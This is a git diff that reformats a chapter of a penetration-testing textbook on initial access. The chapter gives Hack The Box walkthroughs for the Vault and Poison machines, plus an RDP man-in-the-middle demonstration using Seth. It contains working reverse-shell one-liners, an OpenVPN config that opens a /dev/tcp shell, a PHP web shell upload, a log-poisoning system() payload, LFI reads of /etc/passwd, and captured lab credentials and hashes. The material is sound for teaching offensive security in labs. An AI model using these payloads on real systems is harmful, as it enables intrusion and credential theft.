@@ -54,7 +54,9 @@ At the other end, you can still use Netcat in listening mode to handle the incom
 There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](initial-access.md). An example of a reverse shell written in Python is
 
 ```bash
-python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",6001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,\
+socket.SOCK_STREAM);s.connect(("10.0.0.1",6001));os.dup2(s.fileno(),0); \
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
 Expanded, the code looks like this:
@@ -132,7 +134,9 @@ As an added layer of protection, SSH private keys can be encrypted. John The Rip
 
 Another useful utility supported by SSH is "scp" a ssh file copying utility. To copy a file to a remote machine you can use the command:
 
+```bash
 scp -I remote.key localfile.txt user@remote.com:/tmp/remotefile.txt
+```
 
 To copy the remote file to a local file, you just reverse the order of the file paths.
 
@@ -140,67 +144,70 @@ To copy the remote file to a local file, you just reverse the order of the file 
 
 SSH can be used to create an encrypted tunnel that supports port forwarding. There are two types of port forwarding, local and remote. This can be confusing because local forwarding forwards packets from a local port to a port on a remote machine. Remote port forwarding is the opposite, taking packets for a port on a remote machine and forwarding them to a port on the local machine. As an example, let us imagine that you have ssh'd onto a remote machine that is behind a firewall that doesn't allow any traffic out. You would like to access a web server on our local machine to be able to access file from the remote box. To do this, you could use an SSH tunnel as:
 
+```bash
 ssh -R 8000:127.0.0.1:8000 user@remoteserver.htb
+```
 
 From the remote machine, you can now access the web server on the local machine by using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000). Of course, you would need to make sure that nothing was running on port 8000 already on the remote machine.
 
 The converse of this is where you would like to access a port on a remote machine that is only available from that machine. In this case, you use SSH in the same was as before but using the -L flag instead of -R.
 
+```bash
 ssh -L 8000:127.0.0.1:8000 user@remoteserver.htb
+```
 
 From the local machine, you can access the remote server by once again using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000).
 
 A tunnel can be created without actually logging into the machine \(i.e. not running a shell\) by specifying the -N flag.
 
-Dynamic Port Forwarding
+#### Dynamic Port Forwarding
 
 Specifying individual ports to forward works well when you are interested in a specific target for this. There are situations however when there is more than one port that you would like to forward, or indeed a range of ports. To do this you can use dynamic port forwarding which works as a SOCKS proxy.
 
-Ssh -D 1080 user@remoteserver.htb
+```bash
+ssh -D 1080 user@remoteserver.htb
+```
 
 Once this is running, a SOCKS proxy can be configured in settings of the browser, or you can use the application proxychains which allows any application that uses the network to send its commands over the SOCKS proxy you have established. For example, to curl a web server running on the remote host on port 8000, you would use proxychains as:
 
-proxychains curl [http://remoteserver.htb:8000](http://remoteserver.htb:8000)
+```bash
+proxychains curl http://remoteserver.htb:8000
+```
 
 Depending on the tool however, there is often built in support for proxying and so with curl for example, the SOCKs proxy can be specified directly:
 
-curl socks5h://localhost:1080 [http://remoteserver.htb:8000](http://remoteserver.htb:8000)
+```bash
+curl socks5h://localhost:1080 http://remoteserver.htb:8000
+```
 
-Exercise: Initial access and port forwarding on Hack the Box machine Vault
+## Exercise: Initial access and port forwarding on Hack the Box machine Vault
 
 This machine was graded medium difficulty and was actually 3 separate virtual machines with hostnames: ubuntu, DNS and Vault. Although you will be dealing with pivoting later on, solving the machine required the use of local and remote port forwarding over SSH. An additional complication was the presence of a firewall that was blocking traffic to the Vault machine unless the source port was set to 53, the port usually associated with DNS. The firewall can be circumvented in a number of ways but the easiest is to use Ipv6 which hadn't been blocked by the firewall.
 
 An nmap scan of the machine reveals SSH running on port 22 and HTTP running on port 80:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Vault\]
-
-└──╼ $sudo nmap -v -sC -sV --min-rate=1000 -T4 -p- vault.htb -oN Nmap/tcp-full
-
-&lt;SNIP&gt;
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Vault]
+└──╼ $sudo nmap -v -sC -sV --min-rate=1000 -T4 -p- vault.htb \
+-oN Nmap/tcp-full
+<SNIP>
 PORT STATE SERVICE VERSION
-
-22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 \(Ubuntu Linux; protocol 2.0\)
-
-&lt;SNIP&gt;
-
-80/tcp open http Apache httpd 2.4.18 \(\(Ubuntu\)\)
-
-\| http-methods:
-
-\|\_ Supported Methods: GET HEAD POST OPTIONS
-
-\|\_http-server-header: Apache/2.4.18 \(Ubuntu\)
-
-\|\_http-title: Site doesn't have a title \(text/html; charset=UTF-8\).
-
-&lt;SNIP&gt;
-
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+<SNIP>
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_ Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+<SNIP>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 Visiting the website on port 80, you get the text:
 
+```bash
 Welcome to the Slowdaddy web interface
+```
 
 We specialize in providing finanancial organisations with strong web and database solutions and we promise to keep your customers financial data safe.
 
@@ -208,261 +215,216 @@ We are proud to announce our first client: Sparklays \(Sparklays.com still under
 
 Running Gobuster, but with a modified wordlist to add "sparklays" and "Sparklays", you find the sub-directory "sparklays". Running gobuster on this directory reveals the following sub-directories and files:
 
-┌─\[rin@parrot\]─\[~/boxes/Vault\]
-
-└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://vault.htb/sparklays](http://vault.htb/sparklays) -x .php
-
-&lt;SNIP&gt;
-
-/login.php \(Status: 200\)
-
-/admin.php \(Status: 200\)
-
-/design \(Status: 301\)
+```bash
+┌─[rin@parrot]─[~/boxes/Vault]
+└──╼ $gobuster dir -t 50 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-u http://vault.htb/sparklays -x .php
+<SNIP>
+/login.php (Status: 200)
+/admin.php (Status: 200)
+/design (Status: 301)
+```
 
 And again, within the /design sub-directory, you find an additional directory /design/uploads. Navigating to the [http://vault.htb/sparklays/admin.php](http://vault.htb/sparklays/admin.php) returns a login page which doesn't return any errors or other feedback when testing out default username/password combinations like admin/admin. Putting this request into Burp Suite and changing the host header in the request to "localhost" however, you get redirected to another php page " sparklays-local-admin-interface-0001.php" which presents the page shown in Figure 3-2.
 
-!\[Graphical user interface, text, application
-
-Description automatically generated\]\(../.gitbook/assets/1.png\)
-
-Vault admin panel
+![Vault admin panel](../.gitbook/assets/vault.png)
 
 Clicking on "Server Settings" leads to a page under construction. "Design Settings" however, returns a page that allows the logo to be changed. We can upload a PHP file that will give us a reverse shell. There are webshells already installed on Parrot Sec OS located in the directory /usr/share/webshells. We will use the PHP one:
 
+```bash
 /usr/share/webshells/php/php-reverse-shell.php
+```
 
 Copying this file to our working directory and renaming it reverse.php, we can try and upload it using the logo upload feature. The upload function restricts the file types that can be uploaded and so if you try and upload the PHP file you get an error returned saying "sorry that file type is not allowed". However, if you change the extension of the file to another valid PHP extension "reverse.php5", that is allowed. Start a Netcat listener to catch the reverse shell:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Vault\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Vault]
 └──╼ $nc -lvnp 6001
-
-listening on \[any\] 6001 ...
+listening on [any] 6001 ...
+```
 
 We can now navigate to the URL:
 
-[http://vault.htb/sparklays/design/uploads/reverse.php5](http://vault.htb/sparklays/design/uploads/reverse.php5)
+```bash
+http://vault.htb/sparklays/design/uploads/reverse.php5
+```
 
 This then returns a reverse shell which you can upgrade to a full TTY using the Python and bash commands:
 
-python3 -c 'import pty;pty.spawn\("/bin/bash"\)'
-
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 CTL-Z
-
 bg
-
 stty raw -echo
-
 fg
-
 fg
+```
 
 We now have initial access as the user www-data. Exploring the /home directories, you see two users; "alex" and "dave". On exploring the "dave" directory, you find a sub-directory "Desktop" that has files which contain ssh credentials for the user "dave":
 
+```bash
 www-data@ubuntu:/home/dave/Desktop$ ls -al
-
 total 20
-
 drwxr-xr-x 2 dave dave 4096 Sep 3 2018 .
-
 drwxr-xr-x 18 dave dave 4096 Sep 3 2018 ..
-
 -rw-rw-r-- 1 alex alex 74 Jul 17 2018 Servers
-
 -rw-rw-r-- 1 alex alex 14 Jul 17 2018 key
-
 -rw-rw-r-- 1 alex alex 20 Jul 17 2018 ssh
-
 www-data@ubuntu:/home/dave/Desktop$ cat Servers
-
 DNS + Configurator - 192.168.122.4
-
 Firewall - 192.168.122.5
-
 The Vault - x
-
 www-data@ubuntu:/home/dave/Desktop$ cat key
-
 itscominghome
-
 www-data@ubuntu:/home/dave/Desktop$ cat ssh
-
 dave
-
 Dav3therav3123
-
 www-data@ubuntu:/home/dave/Desktop$
+```
 
 We can now login using ssh and the user dave and the password Dav3therav3123.
 
 In the file Servers, it mentioned another machine at the IP address "192.168.122.4". you can see from using the command "ifconfig" that the machine vault has 2 network interfaces with the interface "virbr0" having the IP address 192.168.122.1. you can check what ports might be on the machine with the IP address "192.168.122.4 by using Netcat:
 
+```bash
 nc -vz 192.168.122.4 1-100
+```
 
 The -v flag allows for verbose output and the -z flag does not connect to the port, it just checks if it could connect. Using this, you see that ports 22 and 80 are open.
 
 We can now do a local port forward to get access to port 80 on the box 192.168.122.4
 
-┌─\[rin@parrot\]─\[~/boxes/Vault\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Vault]
 └──╼ $ssh -N -L 8081:192.168.122.4:80 dave@vault.htb
-
 dave@vault.htb's password:
+```
 
 This then allows us to navigate to the web site at [http://127.0.0.1:8081](http://127.0.0.1:8081) where you get links related to DNS and VPN configuration \(Figure 3-4\).
 
-!\[Text
+![Home page on port 8081](../.gitbook/assets/vault2.png)
 
-Description automatically generated\]\(../.gitbook/assets/2%20%282%29.png\)
+The first link goes to a page under construction. The second is a page that allows for openvpn configurations to be tested.
 
-Home page on port 8081
-
-The first link goes to a page under construction. The second is a page that allows for openvpn configurations to be tested \(Figure 3-5\).
-
-!\[Graphical user interface, text, application, email
-
-Description automatically generated\]\(../.gitbook/assets/3%20%281%29.png\)
-
-VPN Configurator page
+![VPN Configurator page](../.gitbook/assets/vault3.png)
 
 Searching for OpenVPN configuration exploits, you find a blog post by Jacob Baines[\[2\]](initial-access.md) which gives a configuration for returning a reverse shell. Adapting this, you can paste the following into the page, update the file and then click Test VPN.
 
+```bash
 Remote 192.168.122.1
-
 nobind
-
 dev tun
-
 script-security 2
+up ​"/bin/bash -c '/bin/bash -I > /dev/tcp/192.168.122.1/6002 0<&1 2>&1&'"
+```
 
-up ​"/bin/bash -c '/bin/bash -I &gt; /dev/tcp/192.168.122.1/6002 0&lt;&1 2&gt;&1&'"
+Rather than run the Netcat listener on the Vault machine however, you can use another SSH remote port forwarder to tunnel the shell back to our local machine. To do this from an existing SSH session, you can use the special characters **~C** at the beginning of the command prompt to drop into an SSH prompt and then set up the remote port forward:
 
-Rather than run the Netcat listener on the Vault machine however, you can use another SSH remote port forwarder to tunnel the shell back to our local machine. To do this from an existing SSH session, you can use the special characters ~C at the beginning of the command prompt to drop into an SSH prompt and then set up the remote port forward:
-
+```bash
 dave@ubuntu:~$
-
-ssh&gt; -R 6002:127.0.0.1:6002
-
+ssh> -R 6002:127.0.0.1:6002
 Forwarding port.
-
 dave@ubuntu:~$
+```
 
 Setting up the listener on the local machine will then give us a reverse shell on the DNS machine as root.
 
-┌─\[rin@parrot\]─\[~/boxes/Vault\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Vault]
 └──╼ $nc -lvnp 6002
-
-listening on \[any\] 6002 ...
-
-connect to \[127.0.0.1\] from \(UNKNOWN\) \[127.0.0.1\] 56806
-
-bash: cannot set terminal process group \(1096\): Inappropriate ioctl for device
-
+listening on [any] 6002 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56806
+bash: cannot set terminal process group (1096): Inappropriate ioctl for device
 bash: no job control in this shell
-
-root@DNS:/var/www/html\#
+root@DNS:/var/www/html#
+```
 
 Looking around the box, you find that the ssh file in /home/dave has a password dav3gerous567.
 
 Looking at the /etc/hosts file, you see an entry for the vault machine:
 
-root@DNS:/home/dave\# cat /etc/hosts
-
+```bash
+root@DNS:/home/dave# cat /etc/hosts
 cat /etc/hosts
-
 127.0.0.1 localhost
-
 127.0.1.1 DNS
-
 192.168.5.2 Vault
-
-\# The following lines are desirable for Ipv6 capable hosts
-
+# The following lines are desirable for Ipv6 capable hosts
 ::1 localhost ip6-localhost ip6-loopback
-
 ff02::1 ip6-allnodes
-
 ff02::2 ip6-allrouters
+```
 
 The machine doesn’t respond to a ping but using nmap on the Vault machine, you find two ports that are closed:
 
+```bash
 PORT STATE SERVICE
-
 53/tcp closed domain
-
 4444/tcp closed krb524
+```
 
 There is a possibility that this response is just poor firewall design and that the reason that 53 responded as closed was because the firewall may be letting anything that looks like DNS traffic through to the box. You can re-run nmap but specify the source port as 53. This gives an open port 987
 
+```bash
 PORT STATE SERVICE
-
 987/tcp open unknown
+```
 
 Running netcat to connect to that port returns and SSH banner suggesting that you can SSH onto that box.
 
-root@DNS:/home/dave\# nc -p 53 Vault 987
-
-SSH-2.0-OpenSSH\_7.2p2 Ubuntu-4ubuntu2.4
+```bash
+root@DNS:/home/dave# nc -p 53 Vault 987
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+```
 
 There are a couple of ways of getting around the firewall restriction to get to the Vault machine. The easiest however is to use Ipv6. In order to do that, you need to find the Ipv6 address of Vault. If you ping the Ipv6 broadcast address, the ping will go to all hosts on the network connected to the "ens3" network interface:
 
-root@DNS:/home/dave\# ping6 -I ens3 ff02::1
-
-PING ff02::1\(ff02::1\) from fe80::5054:ff:fe17:ab49 ens3: 56 data bytes
-
-64 bytes from fe80::5054:ff:fe17:ab49: icmp\_seq=1 ttl=64 time=0.026 ms
-
-64 bytes from fe80::5054:ff:fec6:7066: icmp\_seq=1 ttl=64 time=2.48 ms \(DUP!\)
-
-64 bytes from fe80::5054:ff:fe3a:3bd5: icmp\_seq=1 ttl=64 time=2.49 ms \(DUP!\)
-
-64 bytes from fe80::5054:ff:fee1:7441: icmp\_seq=1 ttl=64 time=3.03 ms \(DUP!\)
+```bash
+root@DNS:/home/dave# ping6 -I ens3 ff02::1
+PING ff02::1(ff02::1) from fe80::5054:ff:fe17:ab49 ens3: 56 data bytes
+64 bytes from fe80::5054:ff:fe17:ab49: icmp_seq=1 ttl=64 time=0.026 ms
+64 bytes from fe80::5054:ff:fec6:7066: icmp_seq=1 ttl=64 time=2.48 ms (DUP!)
+64 bytes from fe80::5054:ff:fe3a:3bd5: icmp_seq=1 ttl=64 time=2.49 ms (DUP!)
+64 bytes from fe80::5054:ff:fee1:7441: icmp_seq=1 ttl=64 time=3.03 ms (DUP!)
+```
 
 From this, you get 4 responses. The first response from fe80::5054:ff:fe17:ab49 you know is from the DNS machine as you can see its Ipv6 address using the ifconfig command. Using the nmap command, you can check which machine has port 987 open and you find that it is the machine with the Ipv6 address fe80::5054:ff:fec6:7066.
 
 We can then just ssh in using the ssh command:
 
+```bash
 ssh -p 987 dave@fe80::5054:ff:fec6:7066%ens3
+```
 
 Once on the box, you can see the root flag that is encrypted using GPG. You can use the gpg application to get more information about the file and find that it has been encrypted using an RSA key with the ID D1EB1F03.
 
+```bash
 dave@vault:~$ ls
-
 root.txt.gpg
-
 dave@vault:~$ gpg root.txt.gpg
-
-gpg: directory \`/home/dave/.gnupg' created
-
-gpg: new configuration file \`/home/dave/.gnupg/gpg.conf' created
-
-gpg: WARNING: options in \`/home/dave/.gnupg/gpg.conf' are not yet active during this run
-
-gpg: keyring \`/home/dave/.gnupg/secring.gpg' created
-
-gpg: keyring \`/home/dave/.gnupg/pubring.gpg' created
-
+gpg: directory `/home/dave/.gnupg' created
+gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
+gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
+gpg: keyring `/home/dave/.gnupg/secring.gpg' created
+gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
 gpg: encrypted with RSA key, ID D1EB1F03
-
 gpg: decryption failed: secret key not available
+```
 
 This key doesn't exist on the Vault machine but does on the ubuntu machine:
 
+```bash
 dave@ubuntu:~$ gpg --list-keys
-
 /home/dave/.gnupg/pubring.gpg
-
 pub 4096R/0FDFBFE4 2018-07-24
-
-uid avid &lt;dave@david.com&gt;
-
+uid avid <dave@david.com>
 sub 4096R/D1EB1F03 2018-07-24
+```
 
 We can use scp \(SSH copy utility\) to copy the file onto the DNS box and then onto the ubuntu machine and decrypt using gpg and the passphrase "itscominghome" that you found in the file called Key earlier.
 
-Remote Desktop Protocol
+## Remote Desktop Protocol
 
 Remote Desktop Protocol \(RDP\) allows user to access their desktop from another machine over a network using the RDP client. The RDP server listens on TCP and UDP port 3389 by default. Users are permitted to use RDP are those in the Remote Desktop Users group. RDP access is one way hackers will gain initial access to a machine if they have a user's credentials. It can also be used to establish persistence, i.e. an easy way to regain access at some later point. In this case, a new user can be created and added to the relevant groups to allow remote desktop access.
 
@@ -472,101 +434,69 @@ There have been a number of exploits of RDP with the most significant recent exp
 
 RDP does not feature in Hack The Box machines, mainly because in the past, it would have been hard to support the many users accessing RDP all at the same time on a VM. However, this is an important technique in an attacker's arsenal and so MITRE for example lists numerous malicious hacker groups as using it to gain access and for lateral movement [\[4\]](initial-access.md).
 
-Exercise: Using Seth in a Man-in-the-Middle Attack
+### Exercise: Using Seth in a Man-in-the-Middle Attack
 
 Hack The Box doesn't have any good examples of RDP exploitation and so to illustrate at least one vulnerability, you will demonstrate how easy it is to get a person's password using Seth.
 
 For this demonstration, you have a Windows 10 box that is configured to accept remote desktop connections as the target. You can use your Windows 10 Commando box if you have set that up. The victim is a remote desktop connection client from any other machine on the network, including the computer you are using to run the VMs on. The attacker machine is our ParrotSec VM. The network is shown in Figure 3-6 below.
 
-Network diagram of RDP man-in-the-middle attack
+![Network diagram of RDP man-in-the-middle attack](../.gitbook/assets/sethnetworkdiag.png)
 
 When you run Seth on the attacker machine and then try and connect using the Remote Desktop Client, you get this output:
 
-┌─\[rin@parrot\]─\[/opt/Seth\]
-
+```bash
+┌─[rin@parrot]─[/opt/Seth]
 └──╼ $sudo ./seth.sh eth0 10.0.1.7 10.0.1.5 10.0.1.8
-
-███████╗███████╗████████╗██╗ ██╗
-
-██╔════╝██╔════╝╚══██╔══╝██║ ██║ by Adrian Vollmer
-
-███████╗█████╗ ██║ ███████║ seth@vollmer.syss.de
-
-╚════██║██╔══╝ ██║ ██╔══██║ SySS GmbH, 2017
-
-███████║███████╗ ██║ ██║ ██║ [https://www.syss.de](https://www.syss.de)
-
-╚══════╝╚══════╝ ╚═╝ ╚═╝ ╚═╝
-
-\[\*\] Linux OS detected, using iptables as the netfilter interpreter
-
-\[\*\] Spoofing arp replies...
-
-\[\*\] Turning on IP forwarding...
-
-\[\*\] Set iptables rules for SYN packets...
-
-\[\*\] Waiting for a SYN packet to the original destination...
-
-\[+\] Got it! Original destination is 10.0.1.27
-
-\[\*\] Clone the x509 certificate of the original destination...
-
-\[\*\] Adjust iptables rules for all packets...
-
-\[\*\] Run RDP proxy...
-
+███████╗███████╗████████╗██╗  ██╗
+██╔════╝██╔════╝╚══██╔══╝██║  ██║ by Adrian Vollmer
+███████╗█████╗     ██║   ███████║ seth@vollmer.syss.de
+╚════██║██╔══╝     ██║   ██╔══██║ SySS GmbH, 2017
+███████║███████╗   ██║   ██║  ██║ https://www.syss.de
+╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
+[*] Linux OS detected, using iptables as the netfilter interpreter
+[*] Spoofing arp replies...
+[*] Turning on IP forwarding...
+[*] Set iptables rules for SYN packets...
+[*] Waiting for a SYN packet to the original destination...
+[+] Got it! Original destination is 10.0.1.27
+[*] Clone the x509 certificate of the original destination...
+[*] Adjust iptables rules for all packets...
+[*] Run RDP proxy...
 Listening for new connection
-
 Connection received from 10.0.1.5:61220
-
 Warning: RC4 not available on client, attack might not work
-
 Downgrading authentication options from 11 to 3
-
 Listening for new connection
-
 Enable SSL
-
 Connection received from 10.0.1.5:61232
-
 Warning: RC4 not available on client, attack might not work
-
 Downgrading authentication options from 11 to 3
-
 Listening for new connection
-
 Enable SSL
-
 Failed to extract keyboard layout information
-
-rin:::afb99ab9d701d668:9511818e381cab338594796e923386ef:010100000000000007cbbd3eb4b8d601699b03023078129f0000000002001e004400450053004b50000bf00510001001e004400450053004b3344550004001e004400450053004b0054004f0050002d004900520052004b0044004e00510003001e004400450053004b0054004f0050002d004900520052004b0044004e0051000700080007cbbd3eb4b8d60106000cd00020000000000000000000000
-
+rin:::afb99ab9d701d668:9511818e381cab338594796e923386ef:
+010100000000000007cbbd3eb4b8d601699b03023078129f00000000
+02001e004400450053004b50000bf00510001001e004400450053004
+b3344550004001e004400450053004b0054004f0050002d004900520
+052004b0044004e00510003001e004400450053004b0054004f00500
+02d004900520052004b0044004e0051000700080007cbbd3eb4b8d60
+106000cd00020000000000000000000000
 Tamper with NTLM response
-
 Downgrading CredSSP
-
 Connection received from 10.0.1.5:61233
-
 Warning: RC4 not available on client, attack might not work
-
 Listening for new connection
-
 Server enforces NLA; switching to 'fake server' mode
-
 Enable SSL
-
-Connection lost on enableSSL: \[Errno 104\] Connection reset by peer
-
+Connection lost on enableSSL: [Errno 104] Connection reset by peer
 Hiding forged protocol request from client
-
 .\rin:S3cr3tP@55w0rd
-
-\[\*\]
+[*]
+```
 
 In this scenario, Network Level Authentication had been configured and so Seth was not able to complete the attack and the connection fails with an error. However, the plaintext username and password are still obtained by the attacker. If the NLA requirement option is switched off, the connection completes, and the user would not be any the wiser.
 
-VNC
+### VNC
 
 VNC is an alternative to RDP that is platform independent. VNC uses the Remote Frame Buffer protocol \(RFB\). It is usually configured to run on ports 5900+N were N is the display number. Whilst RFB is not a secure protocol, VNC can be run through an SSH or VPN tunnel making it secure.
 
@@ -578,317 +508,279 @@ msfvenom -p windows/vncinject/reverse\_tcp LHOST=&lt;Local Host IP address&gt; L
 
 Finally, meterpreter can launch a VNC session by running "run vnc" within a meterpreter session.
 
-Exercise: Exploiting VNC for initial access in Hack The Box machine Poison
+### Exercise: Exploiting VNC for initial access in Hack The Box machine Poison
 
 An nmap scan shows that this machine is running FreeBSD and has port 22 \(SSH\) and port 80 \(HTTP\) open.
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Poison\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Poison]
 └──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- poison.htb -oA nmap/full-tcp
-
 PORT STATE SERVICE VERSION
-
-22/tcp open ssh OpenSSH 7.2 \(FreeBSD 20161230; protocol 2.0\)
-
-&lt;SNIP&gt;
-
-80/tcp open http Apache httpd 2.4.29 \(\(FreeBSD\) PHP/5.6.32\)
-
-\| http-methods:
-
-\|\_ Supported Methods: GET HEAD POST OPTIONS
-
-\|\_http-server-header: Apache/2.4.29 \(FreeBSD\) PHP/5.6.32
-
-\|\_http-title: Site doesn't have a title \(text/html; charset=UTF-8\).
-
+22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+<SNIP>
+80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+| http-methods:
+|_ Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+```
 
 Navigating to the website, there is a home page suggesting that various PHP files can be tested \(Figure 4-6\).
 
-!\[Graphical user interface, text
-
-Description automatically generated\]\(../.gitbook/assets/4%20%287%29.png\)
-
-Home page of Poison machine
+![Home page of Poison machine](../.gitbook/assets/poison1.png)
 
 Inputting one of the filenames listed results in the contents of that file being listed. If we enter listfiles.php, the output is:
 
-Array \( \[0\] =&gt; . \[1\] =&gt; .. \[2\] =&gt; browse.php \[3\] =&gt; index.php \[4\] =&gt; info.php \[5\] =&gt; ini.php \[6\] =&gt; listfiles.php \[7\] =&gt; phpinfo.php \[8\] =&gt; pwdbackup.txt \)
+```php
+Array ( [0] => . [1] => .. [2] => browse.php [3] => 
+index.php [4] => info.php [5] => ini.php [6] => 
+listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
+```
 
 The PHP code is creating an array of filenames. The interesting one is pwdbackup.txt which if we access has the contents:
 
-This password is secure, it's encoded atleast 13 times.. what could go wrong really..
-
+```bash
+This password is secure, it's encoded atleast 13 times.. what could go 
+wrong really..
 Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
-
 bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS…
-
-&lt;SNIP&gt;
+<SNIP>
+```
 
 The encoding format looks like Base64 and so if we simply put the string in a file and decode it13 times we get a password:
 
-┌─\[rin@parrot\]─\[~/boxes/Poison\]
-
-└──╼ $cat password.txt \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d \| base64 -d\| base64 -d\| base64 -d
-
-Charix!2\#4%6&8\(0
+```bash
+┌─[rin@parrot]─[~/boxes/Poison]
+└──╼ $cat password.txt | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d| base64 -d| base64 -d
+Charix!2#4%6&8(0
+```
 
 Going back to the home page, the input to the text box is simply being passed as a parameter called "file" to be displayed:
 
-[http://poison.htb/browse.php?file=listfiles.php](http://poison.htb/browse.php?file=listfiles.php)
+```bash
+http://poison.htb/browse.php?file=listfiles.php
+```
 
 This looks like a candidate for local file inclusion \(LFI\) by tampering with the file parameter. If we try the URL
 
-[http://poison.htb/browse.php?file=/etc/passwd](http://poison.htb/browse.php?file=/etc/passwd)
+```bash
+http://poison.htb/browse.php?file=/etc/passwd
+```
 
 We get the contents of the passwd file returned.
 
-\# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
-
-\#
-
-root:\*:0:0:Charlie &:/root:/bin/csh
-
-toor:\*:0:0:Bourne-again Superuser:/root:
-
-&lt;SNIP&gt;
-
-cups:\*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
-
-charix:\*:1001:1001:charix:/home/charix:/bin/csh
+```bash
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+<SNIP>
+cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
+charix:*:1001:1001:charix:/home/charix:/bin/csh
+```
 
 We can see from the passwd file that there is a user "charix" and using the password we discovered earlier with this, we can SSH into the machine.
 
 This was not the only way that you can gain initial access to the box however. Another way of gaining access is to use a technique called "log poisoning" which involves putting PHP code into the Apache log file that records requests to the site. This log records the URL requested, the protocol, the status code and also the user agent which is the details of the browser client used to make the request. If we put executable PHP into the User Agent header filed in the request and make a request, the next time we use LFI on the log, that code will be executed. The code we can add to the User Agent field is:
 
-&lt;?php system\($\_GET\['c'\]\); ?&gt;
+```php
+<?php system($_GET['c']); ?>
+```
 
 This code takes the value in the query parameter 'c' and executes it using the 'system' command. To add the code to the User Agent field, we can use Burp to intercept the request and then change the value in the Repeater tab before sending it to the server:
 
+```bash
 GET /browse.php?file=/etc/passwd HTTP/1.1
-
 Host: poison.htb
-
-User-Agent: &lt;?php system\($\_GET\['c'\]\); ?&gt;
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
-
+User-Agent: <?php system($_GET['c']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
-
 Accept-Encoding: gzip, deflate
-
 DNT: 1
-
 Connection: close
-
 Upgrade-Insecure-Requests: 1
-
 Sec-GPC: 1
+```
 
 We can test this now by sending a new request to view the log file and pass a command via the parameter 'c':
 
+```bash
 GET /browse.php?file=/var/log/httpd-access.log&c=id HTTP/1.1
+```
 
 This will return the contents of the log file and the final line will be:
 
-10.10.14.135 - - \[\] "GET /browse.php?file=/etc/passwd HTTP/1.1" 200 1894 "-" "uid=80\(www\) gid=80\(www\) groups=80\(www\)"
+```bash
+10.10.14.135 - - [] "GET /browse.php?file=/etc/passwd HTTP/1.1" 200 1894 \
+"-" "uid=80(www) gid=80(www) groups=80(www)"
+```
 
 It took the 'id' command and executed it to return the details of the user 'www'.
 
 We can now execute a reverse shell. Start a Netcat listener on your machine:
 
-┌─\[rin@parrot\]─\[~/boxes/Poison\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Poison]
 └──╼ $nc -lvnp 6001
-
-listening on \[any\] 6001 ...
+listening on [any] 6001 ...
+```
 
 We can now poison the log with PHP reverse shell code:
 
